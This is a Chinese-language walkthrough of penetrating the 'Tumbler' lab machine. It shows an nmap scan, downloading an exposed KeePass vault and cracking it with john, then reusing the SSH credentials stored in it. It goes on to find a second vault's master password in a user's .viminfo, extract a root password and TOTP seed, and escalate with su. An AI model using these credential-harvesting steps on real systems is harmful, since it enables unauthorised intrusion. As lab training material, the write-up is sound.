---
title: Tumbler 靶机渗透记录
published: 2026-11-01
draft: false
category: 网络安全
lang: zh_CN
updated: 2026-11-01
tags:
  - 靶机
  - WP
  - Tumbler
featured:
---

## 1. 信息收集
端口枚举
```
nmap -Pn -sV -p- 192.168.56.131
```
![](<../屏幕截图 2026-11-01 172123.png>)
用浏览器打开`192.168.56.131`界面，页面暴露`/keeweb/`和`/vault/ops.kdbx/`

## 2. 下载密码库
```
mkdir -p ~/tumbler && cd ~/tumbler
curl -s -k -o ops.kdbx https://192.168.56.130/vault/ops.kdbx
file ops.kdbx
```
![](<../Pasted image 20261101172732.png>)

## 3. 爆破/打开库
```
keepass2john ops.kdbx > ops.hash
john --format=keepass --wordlist=/usr/share/wordlists/rockyou.txt ops.hash
john --show --format=keepass ops.hash
```
![](<../Pasted image 20261101173649.png>)
从中拿到主密码：`hollister1`

## 4. 查看密码库内容
由于在虚拟机中无法访问`KeeWeb`界面，于是改用kali本地的`keepassxc-cli`
```
keepassxc-cli ls /home/kali/tumbler/ops.kdbx
```
![](<../Pasted image 20261101180547.png>)
```
keepassxc-cli show -s \
/home/kali/tumbler/ops.kdbx \
"tumbler-ops (ssh)"
```
![](<../Pasted image 20261101180611.png>)
因此获得SSH凭据：
```
用户名：ll104567
密码：Garnet-Tumbler-42x
```

## 5. SSH登录，拿user flag
```
ssh ll104567@192.168.56.131
```
![](<../Pasted image 20261101180847.png>)
得到user flag
```
flag{user-ac10431c73046b9a9579e14e2f9f2669}
```

## 6. 获取 break-glass 密码库

在 Kali 本地新开终端，执行：

```
scp ll104567@192.168.56.131:/srv/vault/breakglass.kdbx \
/home/kali/tumbler/
```

输入 SSH 密码：

```
Garnet-Tumbler-42x
```
![](<../Pasted image 20261101185151.png>)
复制成功后，回到 SSH 会话，读取 Vim 残留：

```
cat /home/kvops/.viminfo
```

在 Vim 寄存器中发现：

```
master: Tumbler-BreakGlass-9f2c!
```
![](<../Pasted image 20261101185257.png>)
因此得到：

```
breakglass.kdbx 主密码：Tumbler-BreakGlass-9f2c!
```

## 7. 查看 break-glass 密码库

先列出条目：

```
keepassxc-cli ls /home/kali/tumbler/breakglass.kdbx
```

输入主密码：

```
Tumbler-BreakGlass-9f2c!
```

得到：

```
root (emergency access)
Recycle Bin/
```
![](<../Pasted image 20261101185351.png>)
查看全部字段：

```
keepassxc-cli show --all -s \
/home/kali/tumbler/breakglass.kdbx \
"root (emergency access)"
```
![](<../Pasted image 20261101185427.png>)
关键输出：

```
Password: princess
otp: otpauth://totp/root@Tumbler.dsz?secret=DHHYK75QRH7LJKIBWSGK3TMLQZ4GABXF&issuer=Tumbler&algorithm=SHA1&digits=6&period=30
```

得到TOTP种子：

```
DHHYK75QRH7LJKIBWSGK3TMLQZ4GABXF
```

其中：

- root 密码：`princess`
- TOTP 算法：SHA1
- 验证码长度：6 位
- 有效期：30 秒

`Uuid` 只是 KeePass 条目的唯一标识符，与 TOTP 无关。

## 8. 生成 TOTP 验证码

可以让 KeePassXC 直接生成当前验证码：

```
keepassxc-cli show -t \
/home/kali/tumbler/breakglass.kdbx \
"root (emergency access)"
```

输出一个 6 位验证码后，需要立即使用，因为验证码约 30 秒后失效。
![](<../Pasted image 20261101185608.png>)
## 9. 使用 `su` 提权

回到 SSH 会话：

```
su -
```

依次输入：

```
Password: princess
Verification code: 当前生成的 6 位验证码
```

成功后检查权限：

```
id
```

如果出现：

```
uid=0(root)
```

说明已经获得 root 权限。

读取 root flag：

```
cat /root/root.txt
```

得到：

```
flag{root-f2c867b95b4138f920982dfa6d647c40}
```
![](<../Pasted image 20261101185646.png>)
